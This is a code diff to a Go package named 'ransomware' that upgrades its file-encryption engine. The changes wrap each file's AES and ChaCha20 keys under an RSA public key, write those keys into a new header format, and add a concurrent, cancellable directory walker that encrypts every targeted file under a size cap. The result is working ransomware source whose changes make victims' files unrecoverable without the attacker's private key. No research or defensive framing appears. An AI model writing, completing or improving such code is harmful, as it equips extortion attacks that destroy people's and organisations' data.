@@ -1,6 +1,7 @@
 package ransomware
 
 import (
+	"context"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -12,10 +13,12 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/fs"
 	"math/big"
 	"os"
 	"path/filepath"
 	"sync"
+	"time"
 
 	ccrypto "github.com/ruby570bocadito/x404x/internal/crypto"
 	"golang.org/x/crypto/chacha20poly1305"
@@ -69,6 +72,14 @@ func (he *HydraEngine) EncryptFile(path string, doubleEncrypt bool) error {
 		return nil
 	}
 
+	fi, err := os.Stat(path)
+	if err != nil {
+		return fmt.Errorf("stat %s: %w", path, err)
+	}
+	if fi.Size() > int64(he.config.MaxFileSize) {
+		return fmt.Errorf("file %s exceeds max size %d", path, he.config.MaxFileSize)
+	}
+
 	data, err := os.ReadFile(path)
 	if err != nil {
 		return fmt.Errorf("read %s: %w", path, err)
@@ -105,13 +116,23 @@ func (he *HydraEngine) EncryptFile(path string, doubleEncrypt bool) error {
 
 		layer2 := aead.Seal(nil, chachaNonce, layer1, nil)
 
-		var header [1 + 32 + 24 + 12]byte
-		header[0] = 2
-		copy(header[1:33], chachaKey)
-		copy(header[33:57], chachaNonce)
-		copy(header[57:69], fileAESNonce)
+		keyBundle := make([]byte, 32+32)
+		copy(keyBundle[0:32], chachaKey)
+		copy(keyBundle[32:64], fileAESKey)
+		encryptedBundle, err := he.rsaEncrypt(keyBundle)
+		if err != nil {
+			return fmt.Errorf("rsa encrypt key bundle: %w", err)
+		}
 
-		finalData = append(header[:], layer2...)
+		header := make([]byte, 1+1+2+len(encryptedBundle)+24+12)
+		header[0] = 3
+		header[1] = 2
+		binary.BigEndian.PutUint16(header[2:4], uint16(len(encryptedBundle)))
+		copy(header[4:4+len(encryptedBundle)], encryptedBundle)
+		copy(header[4+len(encryptedBundle):4+len(encryptedBundle)+24], chachaNonce)
+		copy(header[4+len(encryptedBundle)+24:], fileAESNonce)
+
+		finalData = append(header, layer2...)
 
 		fk := FileKey{
 			ChaChaKey:  chachaKey,
@@ -120,20 +141,22 @@ func (he *HydraEngine) EncryptFile(path string, doubleEncrypt bool) error {
 			AESNonce:   fileAESNonce,
 			DoubleEnc:  true,
 		}
-
-		encKey, err := he.rsaEncrypt(shamirSerialize(fk))
-		if err == nil {
-			rel, _ := filepath.Rel("/", path)
-			he.manifest.FileKeys[rel] = fk
-			_ = encKey
-		}
+		rel, _ := filepath.Rel("/", path)
+		he.manifest.FileKeys[rel] = fk
 	} else {
-		var header [1 + 32 + 12]byte
-		header[0] = 1
-		copy(header[1:33], fileAESKey)
-		copy(header[33:45], fileAESNonce)
+		encryptedKey, err := he.rsaEncrypt(fileAESKey)
+		if err != nil {
+			return fmt.Errorf("rsa encrypt aes key: %w", err)
+		}
 
-		finalData = append(header[:], layer1...)
+		header := make([]byte, 1+1+2+len(encryptedKey)+12)
+		header[0] = 3
+		header[1] = 1
+		binary.BigEndian.PutUint16(header[2:4], uint16(len(encryptedKey)))
+		copy(header[4:4+len(encryptedKey)], encryptedKey)
+		copy(header[4+len(encryptedKey):], fileAESNonce)
+
+		finalData = append(header, layer1...)
 
 		fk := FileKey{
 			AESKey:   fileAESKey,
@@ -154,47 +177,64 @@ func (he *HydraEngine) EncryptFile(path string, doubleEncrypt bool) error {
 	return nil
 }
 
-func (he *HydraEngine) EncryptDirectory(root string, extensions []string, doubleCritical bool) (int, error) {
+func (he *HydraEngine) EncryptDirectory(ctx context.Context, root string, cfg *RansomwareConfig) (int, error) {
+	workers := cfg.EncryptWorkers
+	if workers <= 0 {
+		workers = 4
+	}
+	sem := make(chan struct{}, workers)
 	var wg sync.WaitGroup
-	sem := make(chan struct{}, 8)
-	errChan := make(chan error, 100)
-	count := 0
+	var mu sync.Mutex
+	var encrypted int
+	var firstErr error
 
-	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-		if err != nil || info.IsDir() {
+	filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		default:
+		}
+		if err != nil || d.IsDir() {
 			return nil
 		}
 
 		ext := filepath.Ext(path)
-		shouldDouble := doubleCritical && isCriticalExtension(ext)
-
-		for _, target := range extensions {
-			if ext == target {
-				wg.Add(1)
-				sem <- struct{}{}
-				go func(p string, dbl bool) {
-					defer wg.Done()
-					defer func() { <-sem }()
-					if err := he.EncryptFile(p, dbl); err != nil {
-						errChan <- err
-					}
-				}(path, shouldDouble)
-				count++
-				break
-			}
+		if !cfg.ShouldEncrypt(path) {
+			return nil
 		}
+
+		info, infoErr := d.Info()
+		if infoErr != nil {
+			return nil
+		}
+		if info.Size() > int64(cfg.MaxFileSize) {
+			return nil
+		}
+
+		shouldDouble := cfg.DoubleEncryptCritical && isCriticalExtension(ext)
+
+		wg.Add(1)
+		sem <- struct{}{}
+		go func() {
+			defer wg.Done()
+			defer func() { <-sem }()
+			if err := he.EncryptFile(path, shouldDouble); err != nil {
+				mu.Lock()
+				if firstErr == nil {
+					firstErr = err
+				}
+				mu.Unlock()
+				return
+			}
+			mu.Lock()
+			encrypted++
+			mu.Unlock()
+		}()
 		return nil
 	})
 
 	wg.Wait()
-	close(errChan)
-
-	var errs []error
-	for e := range errChan {
-		errs = append(errs, e)
-	}
-
-	return count, nil
+	return encrypted, firstErr
 }
 
 func (he *HydraEngine) SplitMasterKey() error {
@@ -235,10 +275,10 @@ func (he *HydraEngine) GetShardPrivateKey(index int) []byte {
 }
 
 func (he *HydraEngine) rsaEncrypt(data []byte) ([]byte, error) {
-	for _, pub := range he.rsaPublic {
-		return rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, data, nil)
+	if len(he.rsaPublic) == 0 {
+		return nil, errors.New("no rsa keys available")
 	}
-	return nil, errors.New("no rsa keys")
+	return rsa.EncryptOAEP(sha256.New(), rand.Reader, he.rsaPublic[0], data, nil)
 }
 
 func (he *HydraEngine) Stats() int {
